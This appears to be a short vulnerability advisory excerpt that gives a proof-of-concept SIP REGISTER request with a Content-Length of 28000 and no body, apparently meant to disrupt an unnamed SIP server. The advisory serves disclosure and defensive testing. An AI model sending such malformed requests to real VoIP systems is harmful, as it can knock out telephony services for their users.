An attacker can exploit this issue by supplying the application with 'REGISTER' requests.

The following example request is available:

REGISTER sip:192.168.2.1 SIP/2.0
CSeq: 123 REGISTER
Via: SIP/2.0/UDP localhost:5060;branch=z9hG4bK78adb2cd-0671-e011-81a1-a1816009ca7a;rport
User-Agent: TT
From: &lt;sip:500@192.168.2.1&gt;;tag=642d29cd-0671-e011-81a1-a1816009ca7a
Call-ID: 2e2f07e0499cec3abf7045ef3610f0f2
To: &lt;sip:500@192.168.2.1&gt;
Refer-To: sip:500@192.168.2.1
Contact: &lt;sip:500@localhost&gt;;q=1
Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING
Expires: 3600
Content-Length: 28000
Max-Forwards: 70
